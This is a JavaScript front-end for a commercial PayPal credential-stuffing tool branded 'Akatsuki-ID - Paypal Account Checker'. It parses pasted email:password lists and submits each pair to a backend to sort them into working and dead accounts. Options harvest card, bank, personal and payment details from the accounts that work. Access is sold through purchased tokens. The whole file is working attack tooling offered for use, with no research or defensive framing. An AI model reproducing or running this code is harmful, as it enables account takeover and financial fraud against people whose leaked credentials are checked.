var ajaxCall;

Array.prototype.remove = function(value){
    var index = this.indexOf(value);
    if(index != -1){
        this.splice(index, 1);
    }
    return this;
};
function enableTextArea(bool){
    $('#mailpass').attr('disabled', bool);
}
function ppliveUp(){
    var count = parseInt($('#clive').html());
    count++;
    $('#clive').html(count+'');
}
function pptimeUp(exe_time){
    var count = parseFloat($('#time').html());
    count=count+parseFloat(exe_time);
    $('#time').html(count+'');
}
function pptotalUp(len){
    var count = parseInt($('#ctotal').html());
    count=count+len;
    $('#ctotal').html(count+'');
}
function ppdieUp(){
    var count = parseInt($('#ppdie_count').html());
    count++;
    $('#ppdie_count').html(count+'');
    $('#cdie').html(count+'');
}

function stopLoading(bool){
    $('#loading').attr('src', 'clear.gif');
    var str = $('#checkStatus').html();
    $('#checkStatus').html(str.replace('Checking','Stopped'));
	$('#checkStatus').css('color', 'red');
    enableTextArea(false);
    $('#submit').attr('disabled', false);
    $('#stop').attr('disabled', true);
    $('#loading').hide();
	
    if(bool){
        
    }else{
        ajaxCall.abort();
    }
    updateTitle('Akatsuki-ID - Paypal Account Checker');
}
function updateTitle(str){
    document.title = str;
}
function updateTextBox(mp){
    var mailpass = $('#mailpass').val().split("\n");
    mailpass.remove(mp);
    $('#mailpass').val(mailpass.join("\n"));
}
function checkPaypal(lstMP, curMP, delim, cEmail,info,card,bank,payment,alltoken, no, a, mplist){
	$('#loading').show();
	$('#finish').hide();
    if( lstMP.length<1 ||curMP>=lstMP.length ){
		pptotalUp(mplist);
        stopLoading(true);
		$('#loading').hide();
		$('#finish').show();
		$('#result').show();
		var b = performance.now();
		var c = ((b - a)/1000/60);
		pptimeUp(c.toFixed(2));
        return false;
    }
	$("#now").text(no);
	$("#last").text(lstMP.length);
	var csrf = $('#token').val().trim();
    ajaxCall = $.ajax({
        url: 'post.php',
        dataType: 'json',
        cache: false,
        type: 'POST',
        beforeSend: function (e) {
            updateTitle('Working at '+no+'/'+lstMP.length+' ~ Akatsuki-ID ~');
			$('#checkStatus').html('Checking:' + lstMP[curMP]).effect("highlight", {color:'#00ff00'}, 1000);
			$('#checkStatus').css('color', 'limegreen');
            $('#loading').attr('src', 'loading.gif');
		},
        data: 'ajax=1&do=check&mailpass='+encodeURIComponent(lstMP[curMP])
                +'&delim='+encodeURIComponent(delim)+'&email='+cEmail+'&info='+info+'&card='+card+'&bank='+bank+'&payment='+payment+'&token='+csrf,
        success: function(data) {
            switch(data.error){
                case -1:
					if(alltoken==1){
						$('#use').click();
						setTimeout(function(){
							$('#submit').click();
							return;
						}, 4000);
						return;
					}else{
						$('#ctoken').val('').effect("highlight", {color:'red'}, 1000);
						$("#use").prop('disabled', false);
						$("#token").prop('disabled', false);
						$("#use").val('Use My Access Token!').effect("highlight", {color:'white'}, 1000);
						$('#use').css('color', 'white');
						$('#token').val('INVALID TOKEN ACCESS');
						$('#token').css('background', 'rgba(225,0,0,0.3)');
						stopLoading(true);
						$('#loading').hide();
						return false;
					}
					break;
                case 1:
                case 3:
                    $('#badsock').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
                    break;
                case 2:
					updateTextBox(lstMP[curMP]);
                    curMP++;
					$('#token').css('background', 'rgba(0,225,0,0.4)');
                    document.getElementById('ppdie').innerHTML += data.msg + '\n';
                    ppdieUp();
                    break;
                case 0:
					updateTextBox(lstMP[curMP]);
                    curMP++;
                    $('#token').css('background', 'rgba(0,225,0,0.4)');
					$('#pplive').append(data.msg+'<br />').effect("highlight", {color:'#00ff00'}, 1000);
                    ppliveUp();
                    break;
            }
			no++;
            checkPaypal(lstMP, curMP, delim, cEmail,info,card,bank,payment,alltoken, no, a,mplist);
        }
    });
    return true;
}
function filterMP(mp, delim){
    var mps = mp.split("\n");
    var filtered = new Array();
    var lstMP = new Array();
    for(var i=0;i<mps.length;i++){
        if(mps[i].indexOf('@')!=-1){
            var infoMP = mps[i].split(delim);
            for(var k=0;k<infoMP.length;k++){
                if(infoMP[k].indexOf('@')!=-1){
                    var email = $.trim(infoMP[k]);
                    var pwd = $.trim(infoMP[k+1]);
					if(pwd.length>=8){
						if(filtered.indexOf(email.toLowerCase())==-1){
							filtered.push(email.toLowerCase());
							lstMP.push(email+'|'+pwd);
							break;
						}
					}
                }
            }
        }
    }
    return lstMP;
}
$('#improved .head').click(function(e){
					e.preventDefault();
					$(this).closest('dt').find('.content').not(':animated').slideToggle();
			});
$('#check').click(function() {
	var user_post = $('#user').val().trim();
	var pass_post = $('#pass').val().trim();
	ajaxCall = $.ajax({
        url: 'post.php',
        dataType: 'json',
        cache: false,
        type: 'POST',
        data: 'cmd=check&user='+user_post+'&pass='+pass_post,
        success: function(data) {
			switch(data.error){
				case 0:
					$("#check").prop('disabled', true);
					$("#user").prop('disabled', true);
					$("#pass").prop('disabled', true);
					$("#atoken").text(data.total).effect("highlight", {color:'gold'}, 1000);
					$("#mytoken").show();
					$("#login_page").hide();
					break;
				case 1:
					$('#user').val('Invalid!').effect("highlight", {color:'red'}, 1000);
					$('#pass').val('').effect("highlight", {color:'red'}, 1000);
					alert('INCORRECT USER/PASS!');
					break;
				case 2:
					alert('Buy More Access Token Please!');
					break;
				
			}
			
		}
	});
});
$('#use').click(function() {
	$("#use").prop('disabled', true);
	var user_post = $('#user').val().trim();
	var pass_post = $('#pass').val().trim();
	ajaxCall = $.ajax({
        url: 'post.php',
        dataType: 'json',
        cache: false,
        type: 'POST',
        data: 'cmd=use&user='+user_post+'&pass='+pass_post,
        success: function(data) {
			switch(data.error){
				case 0:
					var count = parseInt($('#atoken').html());
					$("#atoken").text(count-1).effect("highlight", {color:'gold'}, 1000);
					$("#ctoken").val(data.token).effect("highlight", {color:'aqua'}, 1000);
					$("#token").val(data.token).effect("highlight", {color:'white'}, 1000);
					$("#token").prop('disabled', true);
					$("#use").val('Waiting Access Token To Expired!').effect("highlight", {color:'silver'}, 1000);
					$('#use').css('color', 'silver');
					$("#usetoken").show();
					break;
				case 1:
					$('#user').val('Invalid!');
					$('#pass').val('').effect("highlight", {color:'red'}, 1000);
					$("#ctoken").val('').effect("highlight", {color:'red'}, 1000);
					$("#token").val('').effect("highlight", {color:'red'}, 1000);
					alert('INCORRECT USER/PASS!');
					break;
				case 2:
					alert('Buy More Access Token Please!');
					$("#ctoken").val('').effect("highlight", {color:'red'}, 1000);
					$("#token").val('').effect("highlight", {color:'red'}, 1000);
					stopLoading(true);
					$('#loading').hide();
					break;
				
			}
			
		}
	});
});
$(document).ready(function(){
    $('#stop').attr('disabled', true).click(function(){
      stopLoading(false);  
    });
	var no = 1;
    $('#submit').click(function(){
        var delim = $('#delim').val().trim();
        var a = performance.now();
        var mailpass = filterMP($('#mailpass').val(), delim);
		var mplist = mailpass.length;
        var regex = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/g;
        var bank = $('#bank').is(':checked') ? 1 : 0;
        var card = $('#card').is(':checked') ? 1 : 0;
        var info = $('#info').is(':checked') ? 1 : 0;
        var payment = $('#payment').is(':checked') ? 1 : 0;
        var cEmail = $('#email').is(':checked') ? 1 : 0;
		var alltoken = $('#alltoken').is(':checked') ? 1 : 0;
        if($('#mailpass').val().trim()==''){
            alert('No Mail/Pass found!');
            return false;
        }
		if($('#token').val().trim()==''){
            alert('Refill your Access Token!');
            return false;
        }
        $('#mailpass').val(mailpass.join("\n")).attr('disabled', true);
        $('#data').show();
		$('#result').hide();
        $('#submit').attr('disabled', true);
        $('#stop').attr('disabled', false);
        checkPaypal(mailpass, 0, delim, cEmail,info,card,bank,payment,alltoken, no, a,mplist);
        return false; 
    });
});